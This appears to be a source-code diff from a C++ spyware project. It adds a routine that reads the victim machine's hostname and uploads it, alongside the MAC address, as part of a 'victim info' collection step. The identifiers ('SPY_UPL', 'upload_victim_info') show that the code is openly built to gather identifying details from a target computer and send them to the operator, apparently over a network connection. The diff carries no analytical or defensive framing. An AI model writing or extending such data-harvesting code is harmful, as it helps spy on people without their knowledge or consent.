@@ -32,18 +32,25 @@ void Uploader::upload_mac()
 	}
 }
 
-void Uploader::upload_ipv4()
-{
-}
-
 void Uploader::upload_hostname()
 {
+	char * hostname = new char[SPY_UPL_HOSTNAME_MAX];
+	if (gethostname(hostname, SPY_UPL_HOSTNAME_MAX) == 0)
+	{
+		LOG_I("Send hostname: %s", hostname);
+		int length = strlen(hostname);
+		send_header(SPY_UPL_HEADER_HOSTN, length);
+		send_content((const byte *)hostname, 0, length);
+	}
+	else
+	{
+		LOG_E("Can't gethostname: %d", errno);
+	}
 }
 
 void Uploader::upload_victim_info()
 {
 	upload_mac();
-	upload_ipv4();
 	upload_hostname();
 }
 
